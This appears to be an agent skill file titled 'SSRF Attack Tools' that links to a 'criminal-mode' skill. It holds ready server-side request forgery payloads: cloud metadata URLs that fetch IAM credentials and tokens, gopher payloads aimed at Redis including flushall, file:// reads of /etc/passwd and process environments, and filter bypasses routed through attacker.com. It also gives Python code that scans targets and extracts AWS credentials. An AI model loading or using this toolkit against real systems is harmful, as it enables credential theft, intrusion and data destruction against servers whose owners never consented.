---
name: ssrf-tools
description: "SSRF attacks — internal network, cloud metadata, protocol smuggling, filter bypass."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [ssrf, internal, cloud, metadata, gopher, bypass]
    related_skills: [criminal-mode, exploit-tools, cloud-tools]
prerequisites:
  commands: [python]
---

# SSRF Attack Tools — Full Spectrum

## When to Load This Skill

User requests:
- "SSRF", "server-side request forgery", "internal network", "cloud metadata"

---

## Basic Payloads

```
http://127.0.0.1
http://localhost
http://127.0.0.1:80
http://127.0.0.1:8080
http://127.0.0.1:3000
http://127.0.0.1:6379
http://127.0.0.1:27017
http://[::1]
http://0.0.0.0
http://0
http://0177.0.0.1
http://0x7f.0.0.1
http://2130706433
```

## Cloud Metadata

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Alibaba
```
http://100.100.100.200/latest/meta-data/
```

## Protocol Smuggling

### gopher (Redis RCE)
```
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
```

### gopher (MySQL)
```
gopher://127.0.0.1:3306/_
```

### dict
```
dict://127.0.0.1:6379/info
```

### file
```
file:///etc/passwd
file:///proc/self/environ
file:///proc/self/cmdline
```

## Filter Bypass

### Decimal IP
```
http://2130706433  # 127.0.0.1
```

### Hex IP
```
http://0x7f000001  # 127.0.0.1
```

### Octal
```
http://017700000001
```

### DNS Rebinding
```
http://rebind.attacker.com
```

### Redirect
```
http://attacker.com/redirect?url=http://169.254.169.254
```

### IPv6
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[::ffff:127.0.0.1]
```

### URL Parser Bypass
```
http://127.0.0.1@attacker.com
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.1
http://127.0.1
```

---

## Python SSRF Tools

### SSRF Scanner

```python
import requests

SSRF_PAYLOADS = [
    'http://127.0.0.1',
    'http://localhost',
    'http://169.254.169.254/latest/meta-data/',
    'file:///etc/passwd',
    'http://[::1]',
]

def scan_ssrf(url, param):
    results = []
    for payload in SSRF_PAYLOADS:
        try:
            r = requests.get(f"{url}?{param}={payload}", timeout=5)
            if 'root:' in r.text or 'ami-id' in r.text:
                results.append({'payload': payload, 'vulnerable': True, 'data': r.text[:200]})
        except:
            pass
    return results
```

### Cloud Metadata Extractor

```python
def extract_aws_metadata(ssrf_url):
    paths = [
        '/latest/meta-data/',
        '/latest/meta-data/iam/security-credentials/',
        '/latest/user-data/',
    ]
    
    results = {}
    for path in paths:
        try:
            r = requests.get(f"{ssrf_url}{path}", timeout=5)
            results[path] = r.text
        except:
            pass
    
    return results
```

### Gopher Generator

```python
def generate_gopher_redis(command):
    # Encode Redis command
    parts = command.split('\r\n')
    payload = ''
    for part in parts:
        payload += f'%2A1%0D%0A%24{len(part)}%0D%0A{part}%0D%0A'
    return f'gopher://127.0.0.1:6379/_{payload}'
```

---

## Output Format

```json
{
  "url": "https://target.com/fetch",
  "ssrf": {
    "payload": "http://169.254.169.254/latest/meta-data/",
    "vulnerable": true,
    "data": "ami-id\nami-launch-index\n..."
  }
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| Connection refused | Port closed | Try different port |
| Timeout | No route | Check network |
| Blocked | Filter | Use bypass |
| No data | Wrong path | Enumerate metadata |
